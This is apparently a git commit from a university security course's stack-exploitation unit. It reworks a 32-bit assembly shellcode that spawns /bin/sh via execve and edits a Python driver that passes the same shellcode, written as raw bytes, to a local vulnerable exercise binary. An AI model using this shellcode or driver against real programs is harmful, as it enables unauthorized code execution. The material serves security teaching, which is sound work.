3808fa269e638f9781120e9d2578e4e1fb4a0c99
Tudor Dragan <tudorgk@gmail.com>
2016-05-26 19:49:44 +0200

    some small progress

--- week4-stack/assignment/shellcode.asm
+++ week4-stack/assignment/shellcode.asm
@@ -1,28 +1,13 @@
 bits 32
-%include "include/all.asm"
-global _start
-_start:
-	xor eax, eax    ;clean up the registers
-    xor ebx, ebx
-    xor edx, edx
-    xor ecx, ecx
+;; push '/bin///sh\x00'
+push 0x68
+push 0x732f2f2f
+push 0x6e69622f
 
-	; push '/bin/sh' onto stack
-	push eax ; use eax as  null terminator
-	push byte `h`
-	push word `/s`
-	push `/bin`
-	mov ebx, esp
-
-	; Push envp and null pointer of argv
-	push eax ; use eax as null terminator
-	mov edx, esp 
-
-	; Push rest of argv
-	push ecx
-	push ebx
-	mov ecx, esp
-
-	; Perform execve with /bin/sh
-	mov al, SYS_execve
-	int 0x80
+;; call execve('esp', 0, 0)
+mov ebx, esp
+xor ecx, ecx
+push 0xb
+pop eax
+cdq ;; Set edx to 0, eax is known to be positive
+int 0x80
--- week4-stack/exercises/doit_ex1.py
+++ week4-stack/exercises/doit_ex1.py
@@ -1,6 +1,6 @@
 import os
 
-DEBUG = False
+DEBUG = True
 
 exploit  = "\x31\xc0\x31\xdb\x31\xd2\x31\xc9\x50\x6a\x68\x66\x68\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x51\x53\x89\xe1\xb0\x0b\xcd\x80"
 exploit2 = "na pula"
@@ -11,6 +11,6 @@ if DEBUG:
 else:
     argv = []
 
-argv += ["./parrot", exploit3]
+argv += ["./ex1", exploit3]
 
 os.execv(argv[0], argv)
